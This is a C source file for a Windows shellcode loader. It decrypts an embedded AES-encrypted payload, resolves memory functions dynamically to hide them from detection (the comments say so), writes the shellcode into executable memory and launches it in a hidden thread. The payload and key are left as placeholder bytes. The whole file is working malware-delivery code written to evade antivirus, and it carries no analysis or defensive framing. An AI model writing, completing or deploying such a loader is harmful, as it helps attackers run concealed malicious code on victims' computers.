#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

#pragma comment(linker, "/entry:WinMain") // instruct the linker that our entry poitn is WINMAIN


typedef LPVOID (WINAPI * VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
typedef VOID (WINAPI * RtlMoveMemory_t)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}

unsigned char payload[] = {0x00, 0x00, 0x00, 0x00, 0x00...};
unsigned char key[] = {0x00, 0x00, ...};


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) { // hide the window
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
  DWORD oldprotect = 0;

	// resolve functions addresses
	VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "VirtualAlloc");	// GetModuleHandle and GetProcAddress function call obfuscation, call the function with a pointer
	RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "RtlMoveMemory");


	unsigned int payload_len = sizeof(payload);
	
	// Allocate memory for shellcode
	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// AES decrypt the shellced
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	
	// Copy shellcode to the buffer
	pRtlMoveMemory(exec_mem, payload, payload_len);
	
	// Make the buffer RX
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	// If no errors, launch the shellcode
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0); // create a new thread thread launching the shellcode
			WaitForSingleObject(th, -1);
	}

	return 0;
}
